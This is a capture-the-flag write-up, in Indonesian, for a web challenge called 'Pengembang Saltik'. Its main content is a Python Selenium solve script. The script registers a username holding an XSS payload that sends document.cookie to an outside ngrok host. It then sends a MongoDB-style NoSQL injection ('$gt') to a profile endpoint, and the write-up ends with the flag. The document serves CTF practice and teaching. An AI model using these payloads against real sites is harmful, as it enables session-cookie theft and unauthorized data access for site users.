# Pengembang Saltik
---
## Deskripsi
Judul : Pengembang Saltik
Deskripsi : Situs jejaring daring kok banyak salah ketik (saltik). http://40.65.134.119
*notes : database akan direstart setiap 10 menit.
# Solusi
```
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
from requests import Request, Session
import json

url = "http://40.65.134.119"
xss_url = "http://ce0e5646a904.ngrok.io"

# Real Payload
xss_payload = f"<svg onload=fetch('{xss_url}?cookie='+document.cookie)>"
nosqli_payload = {"to":{"$gt":""},"message":"LOL"}


# # Wrong Payload
# xss_payload = "supaa"
# nosqli_payload = {"to":"asd","message":"LOL"}

opts = Options()
# opts.set_headless()
opts.add_experimental_option('excludeSwitches', ['enable-logging'])

browser = webdriver.Chrome("chromedriver.exe",options=opts)
browser.get(url)
username_regist = browser.find_element_by_css_selector("#form1 > input:nth-child(1)")
username_regist.send_keys(xss_payload)
password_regist = browser.find_element_by_css_selector("#form1 > input:nth-child(3)")
password_regist.send_keys("asd")
browser.find_element_by_css_selector(".btn-success").click()
time.sleep(5)
username_login = browser.find_element_by_css_selector("#form > input:nth-child(1)")
username_login.send_keys(xss_payload)
password_login = browser.find_element_by_css_selector("#form > input:nth-child(3)")
password_login.send_keys("asd")
browser.find_element_by_css_selector(".btn-success").click()
time.sleep(5)
headers = {"Content-Type":"application/json"}
cookies = browser.get_cookies()
s = Session()
for cookie in cookies:
    s.cookies.set(cookie['name'], cookie['value'])
req = Request('POST',url+"/profile",headers=headers,json=nosqli_payload)
prepped = s.prepare_request(req)
resp = s.send(prepped)
print(resp.text)

browser.close()
```
#### ara2021{simple_xss_and_nosqli}
